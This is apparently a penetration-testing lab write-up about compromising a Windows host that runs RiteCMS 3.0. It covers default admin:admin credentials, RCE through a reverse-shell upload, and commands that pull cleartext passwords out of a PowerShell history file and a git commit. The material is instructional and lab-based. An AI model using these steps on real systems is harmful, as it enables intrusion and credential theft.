
This server on 249 had port 8000 open which contained a deprecated version of RiteCMS version 3.0. The CMS had default credentials which allowed me to access to the admin panel using admin:admin. Once, in the panel, RCE was possible by uploading a reverse shell to the /media directory.

Once a foothold was established and RCE was obtained(as user adrian), we quickly found cleartext credentials for user damon when checking the powershell history:

```shell
PS C:\Users> cat "C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
ipconfig
hostname
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
PS C:\Users> 

```

Post-Exploitation on 249 reveals there's a .git version control file located in c:\staging

After reviewing the commit history using "git show", I was able to find cleartext password for user maildmz@relia.com and was made aware of the existence of another user named "Jim"

```powershell
PS C:\staging> Get-ChildItem -path c:\ -Force -Recurse -Filter *.git -ErrorAction SilentlyContinue

    Directory: C:\staging

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--h--        10/20/2022   2:07 AM                .git


PS C:\staging>
PS C:\staging> git show
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74 (HEAD -> master)
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file
PS C:\staging>
```

